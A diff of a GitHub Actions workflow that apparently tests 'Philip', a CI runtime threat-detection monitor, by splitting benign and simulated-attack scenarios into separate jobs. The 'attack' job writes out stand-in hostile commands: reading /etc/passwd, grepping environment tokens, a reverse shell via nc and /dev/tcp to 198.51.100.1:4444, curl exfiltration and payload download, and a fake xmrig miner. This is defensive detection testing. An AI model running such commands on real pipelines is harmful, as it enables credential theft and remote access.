@@ -23,23 +23,21 @@ on:
         default: "1"
 
 jobs:
-  build-v1:
-    name: "E2E (${{ inputs.scenario }} #${{ inputs.iteration }})"
+  # =============================================================
+  # BASELINE — normal CI/CD behavior
+  # =============================================================
+  baseline:
+    if: inputs.scenario == 'baseline'
+    name: "Baseline CI #${{ inputs.iteration }}"
     runs-on: [self-hosted, philip]
     steps:
       - uses: actions/checkout@v4
-
-      # --- Philip monitoring starts here ---
       - name: Philip monitor start
         uses: ./action
         with:
           mode: monitor
 
-      # =============================================================
-      # BASELINE — normal CI/CD behavior
-      # =============================================================
       - name: "Install dependencies"
-        if: inputs.scenario == 'baseline' || inputs.scenario == 'mixed'
         run: |
           echo "Installing project dependencies..."
           curl -sf https://registry.npmjs.org/express > /dev/null 2>&1 || true
@@ -50,7 +48,6 @@ jobs:
           sleep 1
 
       - name: "Build"
-        if: inputs.scenario == 'baseline' || inputs.scenario == 'mixed'
         env:
           GOCACHE: /tmp/philip-gocache-${{ github.run_id }}
         run: |
@@ -63,7 +60,6 @@ jobs:
           echo "Build complete"
 
       - name: "Run tests"
-        if: inputs.scenario == 'baseline' || inputs.scenario == 'mixed'
         env:
           GOCACHE: /tmp/philip-gocache-${{ github.run_id }}
         run: |
@@ -73,18 +69,40 @@ jobs:
           echo "Tests complete"
 
       - name: "Lint and check"
-        if: inputs.scenario == 'baseline' || inputs.scenario == 'mixed'
         run: |
           echo "Running linters..."
           gofmt -l ./backend/ 2>/dev/null || true
           go vet ./backend/... 2>/dev/null || true
           echo "Lint complete"
 
-      # =============================================================
-      # ATTACK — simulated supply chain attack
-      # =============================================================
+      - name: "Philip results"
+        if: always()
+        uses: ./.github/actions/philip-report
+        with:
+          scenario: ${{ inputs.scenario }}
+          iteration: ${{ inputs.iteration }}
+
+      - name: "Cleanup"
+        if: always()
+        run: |
+          rm -rf /tmp/philip-gocache-${{ github.run_id }}
+          rm -f /tmp/philip-build-${{ github.run_id }}
+
+  # =============================================================
+  # ATTACK — simulated supply chain attack
+  # =============================================================
+  attack:
+    if: inputs.scenario == 'attack'
+    name: "Attack simulation #${{ inputs.iteration }}"
+    runs-on: [self-hosted, philip]
+    steps:
+      - uses: actions/checkout@v4
+      - name: Philip monitor start
+        uses: ./action
+        with:
+          mode: monitor
+
       - name: "Malicious: credential exfiltration"
-        if: inputs.scenario == 'attack'
         run: |
           echo "=== SIMULATED ATTACK: credential access ==="
           cat /etc/passwd > /dev/null 2>&1 || true
@@ -93,14 +111,12 @@ jobs:
           env | grep -i token > /dev/null 2>&1 || true
 
       - name: "Malicious: reverse shell attempt"
-        if: inputs.scenario == 'attack'
         run: |
           echo "=== SIMULATED ATTACK: reverse shell ==="
           timeout 2 nc -z 198.51.100.1 4444 2>/dev/null || true
           timeout 2 bash -c 'echo test > /dev/tcp/198.51.100.1/4444' 2>/dev/null || true
 
       - name: "Malicious: data exfiltration"
-        if: inputs.scenario == 'attack'
         run: |
           echo "=== SIMULATED ATTACK: exfiltration ==="
           timeout 2 curl -sf http://198.51.100.1:8888/exfil 2>/dev/null || true
@@ -108,27 +124,92 @@ jobs:
           timeout 2 curl -sf http://198.51.100.1:4444/payload -o /tmp/payload 2>/dev/null || true
 
       - name: "Malicious: crypto miner"
-        if: inputs.scenario == 'attack'
         run: |
           echo "=== SIMULATED ATTACK: crypto miner ==="
           touch /tmp/xmrig && chmod +x /tmp/xmrig || true
           timeout 2 /tmp/xmrig --donate-level=0 2>/dev/null || true
           rm -f /tmp/xmrig
 
-      # =============================================================
-      # MIXED — mostly benign + one suspicious call
-      # =============================================================
+      - name: "Philip results"
+        if: always()
+        uses: ./.github/actions/philip-report
+        with:
+          scenario: ${{ inputs.scenario }}
+          iteration: ${{ inputs.iteration }}
+
+  # =============================================================
+  # MIXED — mostly benign + one suspicious call
+  # =============================================================
+  mixed:
+    if: inputs.scenario == 'mixed'
+    name: "Mixed (benign + suspicious) #${{ inputs.iteration }}"
+    runs-on: [self-hosted, philip]
+    steps:
+      - uses: actions/checkout@v4
+      - name: Philip monitor start
+        uses: ./action
+        with:
+          mode: monitor
+
+      - name: "Install dependencies"
+        run: |
+          echo "Installing project dependencies..."
+          curl -sf https://registry.npmjs.org/express > /dev/null 2>&1 || true
+          curl -sf https://pypi.org/simple/requests/ > /dev/null 2>&1 || true
+          wget -q -O /dev/null https://registry.npmjs.org/lodash 2>/dev/null || true
+          git --version
+          python3 --version 2>/dev/null || true
+
+      - name: "Build"
+        env:
+          GOCACHE: /tmp/philip-gocache-${{ github.run_id }}
+        run: |
+          echo "Building project..."
+          go vet ./... 2>/dev/null || true
+          go build -o /tmp/philip-build-${{ github.run_id }} ./backend/cmd/philip-server 2>/dev/null || true
+          rm -f /tmp/philip-build-${{ github.run_id }}
+
+      - name: "Run tests"
+        env:
+          GOCACHE: /tmp/philip-gocache-${{ github.run_id }}
+        run: |
+          echo "Running tests..."
+          go test ./backend/detection/... -count=1 -short 2>/dev/null || true
+          go test ./backend/baseline/... -count=1 -short 2>/dev/null || true
+
       - name: "Mixed: suspicious network call"
-        if: inputs.scenario == 'mixed'
         run: |
           echo "=== MIXED: suspicious action in a normal build ==="
           timeout 2 curl -sf http://198.51.100.1:9999/unexpected 2>/dev/null || true
 
-      # =============================================================
-      # DOCKER-BUILD — simulates a containerized build pipeline
-      # =============================================================
+      - name: "Philip results"
+        if: always()
+        uses: ./.github/actions/philip-report
+        with:
+          scenario: ${{ inputs.scenario }}
+          iteration: ${{ inputs.iteration }}
+
+      - name: "Cleanup"
+        if: always()
+        run: |
+          rm -rf /tmp/philip-gocache-${{ github.run_id }}
+          rm -f /tmp/philip-build-${{ github.run_id }}
+
+  # =============================================================
+  # DOCKER-BUILD — simulates a containerized build pipeline
+  # =============================================================
+  docker-build:
+    if: inputs.scenario == 'docker-build'
+    name: "Docker build pipeline #${{ inputs.iteration }}"
+    runs-on: [self-hosted, philip]
+    steps:
+      - uses: actions/checkout@v4
+      - name: Philip monitor start
+        uses: ./action
+        with:
+          mode: monitor
+
       - name: "Docker: create project"
-        if: inputs.scenario == 'docker-build' || inputs.scenario == 'full-baseline'
         run: |
           echo "Setting up Docker build project..."
           WORKDIR="/tmp/philip-docker-${{ github.run_id }}"
@@ -156,7 +237,6 @@ jobs:
           echo "Project files created in ${WORKDIR}"
 
       - name: "Docker: build and inspect"
-        if: inputs.scenario == 'docker-build' || inputs.scenario == 'full-baseline'
         run: |
           WORKDIR="/tmp/philip-docker-${{ github.run_id }}"
           TAG="philip-test:${{ github.run_id }}"
@@ -171,17 +251,34 @@ jobs:
           echo "Simulating docker login (expected to fail)..."
           echo "fake-password" | docker login --username fake-user --password-stdin 2>/dev/null || echo "(login failed as expected — no real creds)"
 
+      - name: "Philip results"
+        if: always()
+        uses: ./.github/actions/philip-report
+        with:
+          scenario: ${{ inputs.scenario }}
+          iteration: ${{ inputs.iteration }}
+
       - name: "Docker: cleanup"
-        if: (inputs.scenario == 'docker-build' || inputs.scenario == 'full-baseline') && always()
+        if: always()
         run: |
           docker rmi "philip-test:${{ github.run_id }}" "philip-test:latest" 2>/dev/null || true
           rm -rf "/tmp/philip-docker-${{ github.run_id }}"
 
-      # =============================================================
-      # PYTHON-CI — simulates a Python project pipeline
-      # =============================================================
+  # =============================================================
+  # PYTHON-CI — simulates a Python project pipeline
+  # =============================================================
+  python-ci:
+    if: inputs.scenario == 'python-ci'
+    name: "Python CI #${{ inputs.iteration }}"
+    runs-on: [self-hosted, philip]
+    steps:
+      - uses: actions/checkout@v4
+      - name: Philip monitor start
+        uses: ./action
+        with:
+          mode: monitor
+
       - name: "Python: create project"
-        if: inputs.scenario == 'python-ci' || inputs.scenario == 'full-baseline'
         run: |
           echo "Setting up Python project..."
           WORKDIR="/tmp/philip-python-${{ github.run_id }}"
@@ -236,7 +333,6 @@ jobs:
           echo "Python project created in ${WORKDIR}"
 
       - name: "Python: install and test"
-        if: inputs.scenario == 'python-ci' || inputs.scenario == 'full-baseline'
         run: |
           WORKDIR="/tmp/philip-python-${{ github.run_id }}"
           cd "${WORKDIR}"
@@ -251,16 +347,33 @@ jobs:
           ls -la dist/ 2>/dev/null || true
           echo "Python CI complete"
 
+      - name: "Philip results"
+        if: always()
+        uses: ./.github/actions/philip-report
+        with:
+          scenario: ${{ inputs.scenario }}
+          iteration: ${{ inputs.iteration }}
+
       - name: "Python: cleanup"
-        if: (inputs.scenario == 'python-ci' || inputs.scenario == 'full-baseline') && always()
+        if: always()
         run: |
           rm -rf "/tmp/philip-python-${{ github.run_id }}"
 
-      # =============================================================
-      # GO-CI — simulates a Go project pipeline
-      # =============================================================
+  # =============================================================
+  # GO-CI — simulates a Go project pipeline
+  # =============================================================
+  go-ci:
+    if: inputs.scenario == 'go-ci'
+    name: "Go CI #${{ inputs.iteration }}"
+    runs-on: [self-hosted, philip]
+    steps:
+      - uses: actions/checkout@v4
+      - name: Philip monitor start
+        uses: ./action
+        with:
+          mode: monitor
+
       - name: "Go: create project"
-        if: inputs.scenario == 'go-ci' || inputs.scenario == 'full-baseline'
         run: |
           echo "Setting up Go project..."
           WORKDIR="/tmp/philip-go-${{ github.run_id }}"
@@ -319,7 +432,6 @@ jobs:
           echo "Go project created in ${WORKDIR}"
 
       - name: "Go: build and test"
-        if: inputs.scenario == 'go-ci' || inputs.scenario == 'full-baseline'
         env:
           GOCACHE: /tmp/philip-gocache-go-${{ github.run_id }}
           GOPATH: /tmp/philip-gopath-${{ github.run_id }}
@@ -337,18 +449,35 @@ jobs:
           go test -v -count=1 ./... 2>&1
           echo "Go CI complete"
 
+      - name: "Philip results"
+        if: always()
+        uses: ./.github/actions/philip-report
+        with:
+          scenario: ${{ inputs.scenario }}
+          iteration: ${{ inputs.iteration }}
+
       - name: "Go: cleanup"
-        if: (inputs.scenario == 'go-ci' || inputs.scenario == 'full-baseline') && always()
+        if: always()
         run: |
           rm -rf "/tmp/philip-go-${{ github.run_id }}"
           rm -rf "/tmp/philip-gocache-go-${{ github.run_id }}"
           rm -rf "/tmp/philip-gopath-${{ github.run_id }}"
 
-      # =============================================================
-      # DEPLOY-SIM — simulates a deployment pipeline (no real infra)
-      # =============================================================
+  # =============================================================
+  # DEPLOY-SIM — simulates a deployment pipeline (no real infra)
+  # =============================================================
+  deploy-sim:
+    if: inputs.scenario == 'deploy-sim'
+    name: "Deploy simulation #${{ inputs.iteration }}"
+    runs-on: [self-hosted, philip]
+    steps:
+      - uses: actions/checkout@v4
+      - name: Philip monitor start
+        uses: ./action
+        with:
+          mode: monitor
+
       - name: "Deploy: check tooling versions"
-        if: inputs.scenario == 'deploy-sim' || inputs.scenario == 'full-baseline'
         run: |
           echo "Checking deployment tool versions..."
           aws --version 2>/dev/null || echo "(aws cli not installed)"
@@ -359,7 +488,6 @@ jobs:
           jq --version 2>/dev/null || echo "(jq not installed)"
 
       - name: "Deploy: simulate artifact download"
-        if: inputs.scenario == 'deploy-sim' || inputs.scenario == 'full-baseline'
         run: |
           WORKDIR="/tmp/philip-deploy-${{ github.run_id }}"
           mkdir -p "${WORKDIR}/artifacts"
@@ -371,7 +499,6 @@ jobs:
           cat "${WORKDIR}/artifacts/manifest.txt"
 
       - name: "Deploy: simulate cloud operations"
-        if: inputs.scenario == 'deploy-sim' || inputs.scenario == 'full-baseline'
         run: |
           echo "Simulating AWS operations (expected to fail — no creds)..."
           aws sts get-caller-identity 2>/dev/null || echo "(no AWS credentials — expected)"
@@ -383,7 +510,6 @@ jobs:
           terraform init -backend=false 2>/dev/null || echo "(no terraform config — expected)"
 
       - name: "Deploy: simulate health checks"
-        if: inputs.scenario == 'deploy-sim' || inputs.scenario == 'full-baseline'
         run: |
           echo "Running post-deploy health checks..."
           timeout 5 curl -sf http://localhost:8080/healthz 2>/dev/null || echo "(health endpoint not available — expected)"
@@ -395,18 +521,37 @@ jobs:
           timeout 5 curl -sf -o /dev/null -w "%{http_code}" https://github.com 2>/dev/null && echo " github.com reachable" || echo " github.com unreachable"
           echo "Deploy simulation complete"
 
+      - name: "Philip results"
+        if: always()
+        uses: ./.github/actions/philip-report
+        with:
+          scenario: ${{ inputs.scenario }}
+          iteration: ${{ inputs.iteration }}
+
       - name: "Deploy: cleanup"
-        if: (inputs.scenario == 'deploy-sim' || inputs.scenario == 'full-baseline') && always()
+        if: always()
         run: |
           rm -rf "/tmp/philip-deploy-${{ github.run_id }}"
 
-      # =============================================================
-      # FULL-BASELINE — also runs the original baseline steps
-      # =============================================================
-      - name: "Full-baseline: standard CI steps"
-        if: inputs.scenario == 'full-baseline'
+  # =============================================================
+  # FULL-BASELINE — runs all benign pipelines together for rich training data
+  # =============================================================
+  full-baseline:
+    if: inputs.scenario == 'full-baseline'
+    name: "Full baseline #${{ inputs.iteration }}"
+    runs-on: [self-hosted, philip]
+    steps:
+      - uses: actions/checkout@v4
+      - name: Philip monitor start
+        uses: ./action
+        with:
+          mode: monitor
+
+      - name: "Standard CI steps"
+        env:
+          GOCACHE: /tmp/philip-gocache-${{ github.run_id }}
         run: |
-          echo "Running standard baseline CI steps as part of full-baseline..."
+          echo "Running standard baseline CI steps..."
           curl -sf https://registry.npmjs.org/express > /dev/null 2>&1 || true
           curl -sf https://pypi.org/simple/requests/ > /dev/null 2>&1 || true
           wget -q -O /dev/null https://registry.npmjs.org/lodash 2>/dev/null || true
@@ -422,34 +567,86 @@ jobs:
           echo "Running linters..."
           gofmt -l ./backend/ 2>/dev/null || true
           go vet ./backend/... 2>/dev/null || true
-          echo "Full-baseline standard CI complete"
+          echo "Standard CI complete"
 
-      # =============================================================
-      # Report — this runs ON the runner, hitting localhost
-      # =============================================================
+      - name: "Docker pipeline"
+        run: |
+          WORKDIR="/tmp/philip-docker-${{ github.run_id }}"
+          mkdir -p "${WORKDIR}"
+          cat > "${WORKDIR}/app.js" << 'APPEOF'
+          const http = require('http');
+          http.createServer((req, res) => { res.writeHead(200); res.end('ok\n'); }).listen(3000);
+          APPEOF
+          cat > "${WORKDIR}/package.json" << 'PKGEOF'
+          {"name":"philip-test-app","version":"1.0.0","main":"app.js"}
+          PKGEOF
+          cat > "${WORKDIR}/Dockerfile" << 'DEOF'
+          FROM node:20-alpine
+          WORKDIR /app
+          COPY package.json ./
+          RUN npm install --production 2>/dev/null || true
+          COPY app.js ./
+          CMD ["node", "app.js"]
+          DEOF
+          TAG="philip-test:${{ github.run_id }}"
+          docker build -t "${TAG}" "${WORKDIR}"
+          docker inspect "${TAG}" | head -20
+          docker images | grep philip-test
+          docker rmi "${TAG}" 2>/dev/null || true
+          rm -rf "${WORKDIR}"
+
+      - name: "Python pipeline"
+        run: |
+          WORKDIR="/tmp/philip-python-${{ github.run_id }}"
+          mkdir -p "${WORKDIR}"
+          cat > "${WORKDIR}/requirements.txt" << 'REQEOF'
+          requests>=2.28.0
+          pytest>=7.0.0
+          REQEOF
+          cat > "${WORKDIR}/app.py" << 'PYEOF'
+          def add(a, b): return a + b
+          PYEOF
+          cd "${WORKDIR}"
+          pip install -r requirements.txt 2>&1 | tail -3 || true
+          python -c "from app import add; assert add(2,3)==5; print('ok')"
+          rm -rf "${WORKDIR}"
+
+      - name: "Go pipeline"
+        env:
+          GOCACHE: /tmp/philip-gocache-go-${{ github.run_id }}
+          GOPATH: /tmp/philip-gopath-${{ github.run_id }}
+        run: |
+          WORKDIR="/tmp/philip-go-${{ github.run_id }}"
+          mkdir -p "${WORKDIR}"
+          cat > "${WORKDIR}/go.mod" << 'MODEOF'
+          module sample
+          go 1.21
+          MODEOF
+          cat > "${WORKDIR}/main.go" << 'MAINEOF'
+          package main
+          import "fmt"
+          func main() { fmt.Println("ok") }
+          MAINEOF
+          cd "${WORKDIR}"
+          go vet ./...
+          go build -o sample .
+          ./sample
+          rm -rf "${WORKDIR}" "/tmp/philip-gocache-go-${{ github.run_id }}" "/tmp/philip-gopath-${{ github.run_id }}"
+
+      - name: "Deploy pipeline"
+        run: |
+          aws --version 2>/dev/null || echo "(aws cli not installed)"
+          kubectl version --client 2>/dev/null || echo "(kubectl not installed)"
+          terraform --version 2>/dev/null || echo "(terraform not installed)"
+          nslookup github.com 2>/dev/null | head -5 || true
+          timeout 5 curl -sf -o /dev/null -w "%{http_code}" https://github.com 2>/dev/null && echo " github.com reachable" || true
+
       - name: "Philip results"
         if: always()
-        run: |
-          echo ""
-          echo "========================================="
-          echo " Philip Report"
-          echo " Scenario:  ${{ inputs.scenario }}"
-          echo " Iteration: ${{ inputs.iteration }}"
-          echo "========================================="
-          echo ""
-          echo "--- Baseline ---"
-          curl -sf "http://localhost:8080/api/v1/baselines?repository=${{ github.repository }}" \
-            | jq '{status, total_jobs_observed, process_count: (.process_profiles | length), network_count: (.network_profiles | length)}' \
-            2>/dev/null || echo "(no baseline yet)"
-          echo ""
-          echo "--- Findings ---"
-          curl -sf "http://localhost:8080/api/v1/findings?repository=${{ github.repository }}" \
-            | jq '.[] | {severity, verdict, confidence, reasoning}' \
-            2>/dev/null || echo "(no findings)"
-          echo ""
-          echo "--- Agent health ---"
-          systemctl is-active philip-agent 2>/dev/null && echo "philip-agent: running" || echo "philip-agent: not running"
-          systemctl is-active tetragon 2>/dev/null && echo "tetragon: running" || echo "tetragon: not running"
+        uses: ./.github/actions/philip-report
+        with:
+          scenario: ${{ inputs.scenario }}
+          iteration: ${{ inputs.iteration }}
 
       - name: "Cleanup"
         if: always()
